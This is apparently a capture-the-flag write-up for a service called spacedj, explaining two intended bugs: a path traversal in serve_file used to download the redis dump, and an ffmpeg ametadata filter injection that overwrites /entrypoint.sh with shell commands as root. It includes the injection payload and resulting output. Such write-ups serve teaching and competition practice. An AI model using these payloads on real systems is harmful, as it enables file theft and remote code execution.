# spacedj

![alt text](../images/spacedj.png)

## Description

This is a simple looking service for basic audio manipulation, offering some presets (such as bassboost, daycore, nightcore) and an option to customize the coefficients used by the processing engine. As can be noticed from the "changelog" and later from the checker traffic - it does support some math expression syntax alongside with the most common constants and algebra functions.

Results are saved to the filesystem (uploads/{uuid}.mp3) while metadata is saved to the redis (remix_{uuid}).
Flags are stored in the EXIF of the track.

## Vulnerabilities

**First vulnerability** lies in this line of code inside the `serve_file` function:
```python
os.path.join('/app/uploads', request.query.get('name'))
```
Using arbitrary file read we can download redis dump located at the `/var/lib/redis/dump.rdb` (updates every 5 minutes, redis creates it by default), grep filenames and check them one by one.

---
\
**Second vulnerability** is a bit trickier. Further scouting through the code, we can see that all magic is happening inside `dj` module, which is a CPython extension. After superficial reverse, we can notice that this module has libav* linked to it and uses ffmpeg filter graphs. How can we take advantage of that?

Seeking through ffmpeg documentation, [ametadata](https://ffmpeg.org/ffmpeg-filters.html#metadata_002c-ametadata) filter will definitely grab our attention. Why? Because it allows us to write partially controlled content to any file on the filesystem. Impact grows higher when we notice that service container has no custom user configurations, thus everything is running as `root`!

An example exploitation scenario goes as follows:
1. Override `/entrypoint.sh` with `ametadata` output like this (audio should have at least 2 frames, set `loudnorm` (last coefficient) to `1` as well):
```python
f"1,ametadata=add:key=fyec:value='a; \necho PWNED\ncd /app && python3.12 main.py',ametadata=print:file=/entrypoint.sh"
```

2. File will end up looking like:
```
frame:0    pts:0       pts_time:0
fyec=a;
echo PWNED
cd /app && python3.12 main.py
frame:1    pts:338688  pts_time:0.024
fyec=a;
echo PWNED
cd /app && python3.12 main.py
```

3. Crash the app using faulty filters or format string operands. `entrypoint.sh` will continue execution from where it has stopped, ignoring all wrong lines.

```
dj-backend  | Segmentation fault (core dumped)
dj-backend  | /entrypoint.sh: 5: in.py: not found
dj-backend  | /entrypoint.sh: 6: frame:1: not found
dj-backend  | PWNED
```

4. Drop payload, clean traces, steal flags!
----
\
Actually, it was also intended for the module to have third **format string vulnerability**. However, during the service containerisation (which was not really straightforward due to the dynamically linked libraries), we've decided to bump the python version, and that's where `PRINTF_FORTIFY` sneaked in. We were late to notice that. Rest in pepperoni :(